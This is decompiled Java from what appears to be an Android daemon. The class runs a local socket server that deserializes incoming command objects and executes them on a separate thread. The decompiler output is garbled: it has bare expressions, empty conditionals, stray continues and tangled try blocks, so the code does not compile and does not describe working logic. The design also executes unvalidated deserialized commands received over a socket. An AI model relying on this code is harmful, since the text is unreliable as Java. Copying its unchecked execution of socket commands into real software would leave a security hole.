package com.fx.socket;

import android.net.LocalServerSocket;
import android.net.LocalSocket;
import com.fx.socket.command.RemoteCheckAvailable;
import com.fx.socket.command.RemoteCloseServer;
import com.vvt.io.d;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;

public class b
  extends Thread
{
  private static final boolean b;
  private static final boolean c;
  private static final boolean d;
  a a;
  private LocalServerSocket e;
  private String f;
  private String g;
  private int h;
  
  static
  {
    boolean bool = com.vvt.ak.a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      b = bool;
      c = com.vvt.ak.a.b;
      d = com.vvt.ak.a.e;
      return;
    }
  }
  
  public b(String paramString1, String paramString2, a parama)
  {
    this.g = paramString1;
    this.f = paramString2;
    this.a = parama;
    try
    {
      boolean bool1 = b;
      if (bool1) {}
      LocalServerSocket localLocalServerSocket = new android/net/LocalServerSocket;
      localLocalServerSocket.<init>(paramString2);
      this.e = localLocalServerSocket;
      int i = d.a(this.e.getFileDescriptor());
      this.h = i;
      return;
    }
    catch (IOException localIOException)
    {
      boolean bool2 = d;
      if (bool2) {}
      FxSocketException localFxSocketException = new com/fx/socket/FxSocketException;
      localFxSocketException.<init>(localIOException);
      throw localFxSocketException;
    }
  }
  
  private void a(ObjectInputStream paramObjectInputStream, ObjectOutputStream paramObjectOutputStream, LocalSocket paramLocalSocket)
  {
    if (paramObjectInputStream != null) {}
    try
    {
      paramObjectInputStream.close();
      if (paramObjectOutputStream == null) {}
    }
    catch (IOException localIOException2)
    {
      try
      {
        paramObjectOutputStream.close();
        if (paramLocalSocket == null) {}
      }
      catch (IOException localIOException2)
      {
        try
        {
          for (;;)
          {
            paramLocalSocket.close();
            return;
            localIOException1;
          }
          localIOException2;
        }
        catch (IOException localIOException3)
        {
          for (;;) {}
        }
      }
    }
  }
  
  public void a()
  {
    boolean bool = c;
    if (bool) {}
    RemoteCloseServer localRemoteCloseServer = new com/fx/socket/command/RemoteCloseServer;
    String str = this.f;
    localRemoteCloseServer.<init>(str);
    try
    {
      localRemoteCloseServer.execute();
      return;
    }
    finally
    {
      for (;;)
      {
        bool = d;
        if (!bool) {}
      }
    }
  }
  
  public void run()
  {
    bool1 = true;
    f1 = Float.MIN_VALUE;
    if (bool1) {}
    for (;;)
    {
      try
      {
        localObject1 = this.e;
        localLocalSocket = ((LocalServerSocket)localObject1).accept();
        if (localLocalSocket == null)
        {
          bool2 = d;
          if (bool2) {}
          bool2 = b;
          if (bool2) {}
          localObject1 = this.e;
          if (localObject1 == null) {
            continue;
          }
          bool2 = b;
          if (!bool2) {}
        }
      }
      catch (Exception localException2)
      {
        Object localObject1;
        LocalSocket localLocalSocket;
        ObjectInputStream localObjectInputStream;
        ObjectOutputStream localObjectOutputStream;
        bool2 = d;
        if (bool2) {}
        localLocalServerSocket = this.e;
        if (localLocalServerSocket == null) {
          continue;
        }
        bool2 = b;
        if (bool2) {}
        try
        {
          localLocalServerSocket = this.e;
          localLocalServerSocket.close();
          bool2 = false;
          f2 = 0.0F;
          localLocalServerSocket = null;
          this.e = null;
        }
        catch (IOException localIOException1)
        {
          bool2 = d;
        }
        if (!bool2) {
          continue;
        }
        continue;
        bool2 = d;
        if (!bool2) {
          continue;
        }
        continue;
        bool2 = d;
        if (!bool2) {
          continue;
        }
        continue;
      }
      finally
      {
        Object localObject4 = this.e;
        if (localObject4 == null) {
          continue;
        }
        boolean bool3 = b;
        if (!bool3) {
          continue;
        }
        try
        {
          localObject4 = this.e;
          ((LocalServerSocket)localObject4).close();
          bool3 = false;
          localObject4 = null;
          this.e = null;
        }
        catch (IOException localIOException3)
        {
          bool3 = d;
          if (!bool3) {
            continue;
          }
          continue;
        }
        throw ((Throwable)localObject2);
        bool3 = d;
        if (!bool3) {
          continue;
        }
        continue;
        boolean bool2 = bool1;
        float f2 = f1;
        continue;
      }
      try
      {
        localObject1 = this.e;
        ((LocalServerSocket)localObject1).close();
        bool2 = false;
        f2 = 0.0F;
        localObject1 = null;
        this.e = null;
        return;
      }
      catch (IOException localIOException2)
      {
        bool2 = d;
        if (!bool2) {
          continue;
        }
      }
    }
    localObjectInputStream = new java/io/ObjectInputStream;
    localObject1 = localLocalSocket.getInputStream();
    localObjectInputStream.<init>((InputStream)localObject1);
    localObjectOutputStream = new java/io/ObjectOutputStream;
    localObject1 = localLocalSocket.getOutputStream();
    localObjectOutputStream.<init>((OutputStream)localObject1);
    for (;;)
    {
      try
      {
        localObject3 = localObjectInputStream.readObject();
        localObject3 = (SocketCmd)localObject3;
        bool2 = localObject3 instanceof RemoteCloseServer;
        bool3 = localObject3 instanceof RemoteCheckAvailable;
        if ((bool2) || (bool3))
        {
          bool3 = true;
          localObject4 = Boolean.valueOf(bool3);
          if (!bool2) {
            break label484;
          }
          bool2 = c;
          if (bool2) {}
          bool2 = false;
          f2 = 0.0F;
          localObject1 = null;
        }
      }
      catch (Exception localException1)
      {
        Object localObject3;
        bool2 = bool1;
        f2 = f1;
      }
      try
      {
        localObjectOutputStream.writeObject(localObject4);
        localObjectOutputStream.flush();
        a(localObjectInputStream, localObjectOutputStream, localLocalSocket);
        bool1 = bool2;
        f1 = f2;
      }
      catch (Exception localException3)
      {
        LocalServerSocket localLocalServerSocket;
        for (;;) {}
      }
      localObject1 = new com/fx/socket/c;
      localObject4 = this;
      ((c)localObject1).<init>(this, localObjectInputStream, localObjectOutputStream, localLocalSocket, (SocketCmd)localObject3);
      localObject4 = "ExecThread";
      ((c)localObject1).setName((String)localObject4);
      ((c)localObject1).start();
      bool2 = bool1;
      f2 = f1;
      continue;
      bool3 = d;
      if (bool3) {}
      a(localObjectInputStream, localObjectOutputStream, localLocalSocket);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/fx/socket/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */